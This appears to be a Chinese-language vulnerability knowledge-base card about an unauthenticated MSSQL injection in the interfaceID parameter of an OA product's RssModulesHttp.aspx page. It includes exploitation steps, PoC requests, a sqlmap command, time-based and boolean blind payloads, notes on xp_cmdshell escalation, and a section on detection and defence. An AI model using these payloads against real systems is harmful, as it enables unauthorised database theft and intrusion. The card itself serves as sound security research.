---
id: web-generic-sqli-jhsoft-rssmoduleshttp-interfaceid-unauth
title: 某和OA RssModulesHttp.aspx interfaceID 未授权 SQL 注入：GetRssInfo 直接把参数拼进 MSSQL 查询
type: scenario
domain: web
path: web/generic/sqli
technique: jhsoft-rssmoduleshttp-interfaceid-sqli
tags:
- dotnet
- aspx
- mssql
- sqli
- jhsoft
- oa
- unauth
- sqlmap
cve: []
severity: high
confidence: high
affected_versions: 某和OA协同办公管理系统 C6
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V404
  verified_at: '2026-11-09T13:32:23+08:00'
  notes: 已对照原文与图07/08/09 核对：Page_Load 取 Request.QueryString[interfaceID].ToString() 直接传 GetRssInfo；GetRssInfo 中 select title,RssUrl,DisplayTypeID,RowNumber from WFRssModule where id=+interfaceID 经 dbo.ExecSQLReDataTable 执行，无参数化；出错时 JHBase.Error.ThrowException 带 dbo.ErrMessage。图09 sqlmap 实测 MSSQL、布尔盲注、时间盲注(WAITFOR DELAY '0:0:5')、4 列 UNION，payload 与卡内示例一致。未授权可达性依赖同批 .aspx/ 后缀绕过卡。注：错误信息是否回显到客户端原文未展示，卡内已注明取决于异常处理配置；xp_cmdshell 属潜在升级路径已标注未验证。原文明确 C6，已 set-versions。与同产品其他 JHSoft 注入点页面/参数不同，非重复。无 sources/文章ID/URL。
url: /docs/web/generic/sqli/web-generic-sqli-jhsoft-rssmoduleshttp-interfaceid-unauth/
draft: false
kb_aliases:
- RssModulesHttp.aspx
- interfaceID 注入
- GetRssInfo SQL 注入
- WFRssModule 注入
- JHSoft SQL注入
- 某和OA SQL注入
---

## 一句话结论

某和 OA 的 `RssModulesHttp.aspx` 在 `Page_Load` 中把 `Request.QueryString["interfaceID"]` 原样交给 `GetRssInfo`，后者用字符串拼接构造 `select title, RssUrl, DisplayTypeID, RowNumber from WFRssModule where id=<interfaceID>` 并交给 `dbo.ExecSQLReDataTable` 执行，没有参数化；`interfaceID` 因此是 MSSQL 注入点。配合 `ExtensionlessUrlHandler` 的路径后缀绕过（`/RssModulesHttp.aspx/?interfaceID=1`），未登录即可注入，sqlmap 实测布尔/时间盲注（WAITFOR DELAY）成功。

## 原理

- **数据流**：页面 `Page_Load` 执行 `string interfaceID = base.Request.QueryString["interfaceID"].ToString(); DataTable rssInfo = this.wfdc.GetRssInfo(interfaceID);`——没有类型校验、没有白名单、没有转义。
- **汇点**：`GetRssInfo(string interfaceID)` 内 `string queryString = "select title, RssUrl, DisplayTypeID, RowNumber from WFRssModule where id=" + interfaceID; DataTable result = this.dbo.ExecSQLReDataTable(queryString);`。字符串拼接直接进入 MSSQL 执行，`interfaceID` 可注入任意 SQL 语法。
- **错误信息放大**：`GetRssInfo` 捕获 `dbo.IsError` 并把 `dbo.ErrorMessage` 存到 `errMessage`；页面层 `JHBase.Error.ThrowException("WorkFlat", ..., new Exception(this.wfdc.ErrMessage))` 会抛出带数据库错误的异常，便于报错注入/探测（具体回显取决于异常处理配置）。
- **利用前缀**：由于该页面的访问在全局鉴权中被路径后缀绕过（`.aspx/?interfaceID=1` 不以 `.aspx` 结尾），攻击者不需要登录即可到达注入点；即使目标修补了全局绕过，若该页自身未做鉴权，仍可能直接可达。
- **数据库特征**：sqlmap 识别后端为 Microsoft SQL Server，Web 服务器 Microsoft-IIS/8.5、ASP.NET 4.0.30319；可用的注入类型包括布尔盲注、堆叠查询（视权限）、时间盲注（`WAITFOR DELAY '0:0:5'`）。

## 触发条件

- 目标为某和 OA（C6）且存在 `RssModulesHttp.aspx` 页面、依赖 `WFRssModule` 表。
- `interfaceID` 参数可达（直接访问或通过 `.aspx/` 路径后缀绕过全局鉴权）。
- 后端为 MSSQL；数据库账号权限决定能否堆叠查询/读写文件/命令执行。
- 页面未对 `interfaceID` 做数字型校验或参数化查询。

## 利用步骤

1. 探测页面是否存在：请求 `/c6/JHsoft.web.Workflat/RssModulesHttp.aspx?interfaceID=1`（或带路径后缀的绕过形式 `/RssModulesHttp.aspx/?interfaceID=1`）。
2. 判断注入：`interfaceID=1'`、`1 AND 1=1`、`1 AND 1=2` 观察页面/异常差异；或直接用 sqlmap 检测。
3. 布尔/时间盲注：`interfaceID=1 AND (SELECT ...)`；时间盲注 `interfaceID=1;WAITFOR DELAY '0:0:5'--`（分号与注释符按 SQL Server 语法调整）。
4. 提取数据：枚举库名/表名/列名（WFRssModule 及其他业务表），导出管理员账号、配置等敏感数据。
5. 若数据库权限足够，可尝试堆叠查询执行 `xp_cmdshell` 等（需 sysadmin/相应权限且组件启用；原文未验证到该步，属潜在升级路径）。
6. 通过 SQL 注入获取的数据进一步登录后台/横向，或结合其他 .aspx 接口扩大影响。

## PoC

最小请求与 sqlmap 用法：

```http
### 直接探测
GET /c6/JHsoft.web.Workflat/RssModulesHttp.aspx?interfaceID=1 HTTP/1.1
Host: target

### 经全局绕过形式（未登录）
GET /c6/JHsoft.web.Workflat/RssModulesHttp.aspx/?interfaceID=1 HTTP/1.1
Host: target
```

```bash
# 布尔/时间盲注检测（示例参数）
sqlmap -u "http://target/c6/JHsoft.web.Workflat/RssModulesHttp.aspx/?interfaceID=1" \
       -p interfaceID --batch --dbms=mssql --technique=BT --level=3
```

原文实测 payload 形态（时间盲注）：

```sql
1;WAITFOR DELAY '0:0:5'--
```

布尔盲注示例（sqlmap 生成的形态）：

```sql
1 AND (SELECT (CASE WHEN (7592=7592) THEN 1 ELSE (SELECT 5276 UNION SELECT 2545) END))
```

## 变体与关联

- **同产品其他 SQL 注入点**：某和 OA 的 `GeneralXmlHttpPage.aspx`、`AddressImportPub`、`TaskTreeJson`、`HomeService`、`IncentivePlan` 等接口也存在字符串拼接注入（不同参数/函数），说明该产品整体缺乏参数化查询规范。
- **全局鉴权绕过**：本卡的未授权可利用性依赖 `ExtensionlessUrlHandler` + `EndsWith(".aspx")` 路径后缀绕过；若目标修补了该绕过，需重新评估页面自身鉴权。
- **错误信息回显**：`dbo.ErrorMessage` 被抛到页面，若异常处理把消息返回给客户端，可做报错注入；否则以时间/布尔盲注为主。
- **权限升级**：MSSQL 堆叠查询 + `xp_cmdshell`/OLE 自动化可升级为命令执行，但取决于数据库账号权限与配置，原文未验证，需单独确认。

## 检测与防御

- **参数化查询**：`GetRssInfo` 改用 `SqlParameter`/存储过程，`interfaceID` 按整数解析；禁止把请求参数拼进 SQL 字符串。
- **输入校验**：`interfaceID` 只允许数字；对查询返回值做长度/类型约束；在全局过滤之外，每个接口自身也要校验。
- **错误处理**：不要把 `dbo.ErrorMessage`/异常堆栈返回给客户端；统一 500 页面并记录到服务端日志。
- **权限最小化**：Web 应用数据库账号只授予必要表的 SELECT/INSERT/UPDATE，禁用 `xp_cmdshell`、OLE Automation、高权限角色，降低注入升级面。
- **鉴权修复**：修复全局 `EndsWith(".aspx")` 绕过（见关联卡），并对 `RssModulesHttp.aspx` 单独加认证；`.ashx/.asmx` 一并纳入检查。
- **检测**：WAF/日志关注 `interfaceID` 中的 `'`、`;`、`WAITFOR`、`UNION`、`CASE WHEN`；对 `.aspx?interfaceID=`/`.aspx/?interfaceID=` 的异常请求告警；sqlmap UA/请求特征也可作为辅助。
- **审计**：全量搜索 `Request.QueryString` 直接进入 `ExecSQLReDataTable`/字符串拼接的函数，建立 .NET OA 的注入点清单。
